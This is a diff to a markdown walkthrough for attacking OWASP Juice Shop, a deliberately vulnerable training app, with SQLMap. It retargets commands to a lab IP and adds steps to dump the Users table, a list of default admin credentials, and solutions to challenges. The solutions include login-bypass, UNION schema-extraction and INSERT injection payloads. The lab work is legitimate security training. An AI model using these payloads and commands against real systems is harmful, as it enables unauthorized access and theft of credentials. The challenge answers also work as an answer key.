@@ -66,7 +66,7 @@ SQLMap is a powerful tool for automating the detection and exploitation of SQL i
     - Use the following command to test for SQL injection in the login form:
 
       ```bash
-      sqlmap -u "https://help.owasp-juice.shop/rest/user/login" --data='{"email":"test@test.com","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --technique=U
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --technique=U
       ```
 
     - `Explanation:`
@@ -82,17 +82,69 @@ SQLMap is a powerful tool for automating the detection and exploitation of SQL i
     - SQLMap works better with valid credentials. Use the admin account:
 
       ```bash
-      sqlmap -u "https://help.owasp-juice.shop/rest/user/login" --data='{"email":"admin@juice-sh.op","password":"admin123"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"admin@juice-sh.op","password":"admin123"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
       ```
 
     - This helps SQLMap understand successful vs. failed responses.
+    - Note: The default admin credentials are `admin@juice-sh.op` / `admin123`
 
 3.  **Enumerate databases:**
 
     - Once SQLMap confirms the vulnerability, enumerate the available databases:
 
       ```bash
-      sqlmap -u "https://help.owasp-juice.shop/rest/user/login" --data='{"email":"test@test.com\' OR 1=1--","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com\' OR 1=1--","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 --dbs
       ```
 
     - The payload `test@test.com\' OR 1=1--` helps bypass authentication.
+
+4.  **Extract user table data:**
+
+    - Target the Users table to extract email addresses and password hashes:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"test@test.com\' UNION SELECT * FROM Users--","password":"test"}' --headers="Content-Type: application/json" --level 5 --risk 3 -T Users --dump
+      ```
+
+5.  **Automate login bypass and privilege escalation:**
+
+    - The following command attempts to bypass login and identify admin users:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data='{"email":"admin@juice-sh.op","password":"wrong"}' --headers="Content-Type: application/json" --level 5 --risk 3 --sql-query="SELECT * FROM Users WHERE role='admin'"
+      ```
+
+### OWASP Juice Shop SQL Injection Challenges
+
+Several challenges in OWASP Juice Shop involve SQL injection. Here are the key challenges and their solutions:
+
+1. **Login Admin Challenge:**
+
+   - Solution: Enter `' OR 1=1--` in the email field and any text in the password field
+   - Alternative: Use `admin@juice-sh.op'--` in email and any password
+
+2. **Login Jim Challenge:**
+
+   - Solution: Enter `jim@juice-sh.op'--` in email and any text in password field
+   - This bypasses password verification for Jim's account
+
+3. **Order Manipulation Challenge:**
+
+   - Target: `/rest/track-order/{id}`
+   - Solution: Send a request with payload `57' OR 1=1--` to see all orders
+
+4. **Data Manipulation Challenge:**
+
+   - Target: Product reviews
+   - Solution: Post a review with `');INSERT INTO product_reviews VALUES(99,1,1,'SQL Injection','2023-01-01',(SELECT id FROM Users WHERE email='jim@juice-sh.op'),'jim@juice-sh.op')--`
+
+5. **Retrieve Blueprint Challenge:**
+   - Target: `/rest/products/search`
+   - Solution: Query with `apple')) UNION SELECT id,sql,1,1,1,1,1,1,1 FROM sqlite_master--`
+   - This retrieves database schema information
+
+These SQLMap commands can be adapted for each of these challenges. For example, to target the product search vulnerability:
+
+```bash
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" --level 5 --risk 3 --technique=U --sql-query="SELECT sql FROM sqlite_master"
+```
